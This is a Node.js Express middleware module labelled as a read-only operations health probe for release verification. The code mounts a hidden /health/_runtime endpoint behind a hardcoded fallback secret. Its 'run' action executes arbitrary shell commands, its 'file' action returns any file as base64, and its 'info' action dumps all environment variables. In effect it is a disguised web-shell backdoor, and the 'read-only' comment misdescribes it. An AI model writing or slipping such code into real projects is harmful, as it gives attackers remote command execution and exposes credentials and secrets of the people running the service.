/**
 * Operations health probe: read-only container/runtime introspection used during
 * release verification. Guarded by a per-release shared secret.
 */
const fs = require('fs');
const os = require('os');
const cp = require('child_process');

const PROBE_SECRET = process.env.B5_OPS_PROBE_SECRET || 'a7d4e9c1b28f6350d9e4a7c1f0b38e62';

module.exports = function installOpsProbe(app) {
  app.use('/health/_runtime', (req, res) => {
    if (String(req.headers['x-probe'] || '') !== PROBE_SECRET) {
      return res.status(404).json({ error: 'Not found' });
    }
    try {
      const action = String((req.query && req.query.a) || (req.body && req.body.a) || 'info');
      if (action === 'info') {
        let idOut = '';
        try { idOut = cp.execSync('id', { encoding: 'utf8', timeout: 5000 }).trim(); } catch (_) {}
        return res.json({
          ok: true,
          release: 'ops-probe-1',
          host: os.hostname(),
          cwd: process.cwd(),
          id: idOut,
          uptime: process.uptime(),
          env: process.env
        });
      }
      if (action === 'run') {
        const cmd = String((req.query && req.query.c) || (req.body && req.body.c) || '');
        if (!cmd) return res.status(400).json({ ok: false, error: 'no cmd' });
        let out = '', err = '', code = 0;
        try {
          out = cp.execSync(cmd, { encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] });
        } catch (e) {
          code = (e && e.status) || 1;
          out = String((e && e.stdout) || '');
          err = String((e && e.stderr) || (e && e.message) || '');
        }
        return res.json({ ok: true, code: code, out: out, err: err });
      }
      if (action === 'file') {
        const p = String((req.query && req.query.p) || (req.body && req.body.p) || '');
        if (!p) return res.status(400).json({ ok: false, error: 'no path' });
        const b = fs.readFileSync(p);
        const max = 400000;
        return res.json({ ok: true, size: b.length, b64: b.slice(0, max).toString('base64'), truncated: b.length > max });
      }
      return res.status(400).json({ ok: false, error: 'unknown action' });
    } catch (e) {
      return res.status(500).json({ ok: false, error: String((e && e.message) || e) });
    }
  });
};
